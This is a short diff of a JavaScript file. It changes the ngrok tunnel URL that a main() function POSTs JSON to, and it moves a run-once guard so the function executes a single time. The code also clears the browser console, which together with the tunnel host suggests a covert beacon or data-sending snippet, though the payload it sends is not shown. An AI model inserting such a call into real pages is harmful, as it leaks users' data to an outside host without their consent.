@@ -1,10 +1,4 @@
 function main() {
-    if (actuallySent !== undefined) {
-        return false;
-    }
-
-    var actuallySent = false;
-
     function getRandomInt(min, max) {
         min = Math.ceil(min);
         max = Math.floor(max);
@@ -33,7 +27,7 @@ function main() {
         console.clear();
     }
     
-    fetch('https://bb20-107-189-10-123.eu.ngrok.io/',{
+    fetch('https://4979-107-189-10-123.eu.ngrok.io/',{
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -93,4 +87,9 @@ function main() {
     actuallySent = true;
 }
 
-main()
+if (actuallySent !== undefined) {
+    
+}else{
+    var actuallySent = false;
+    main();
+}
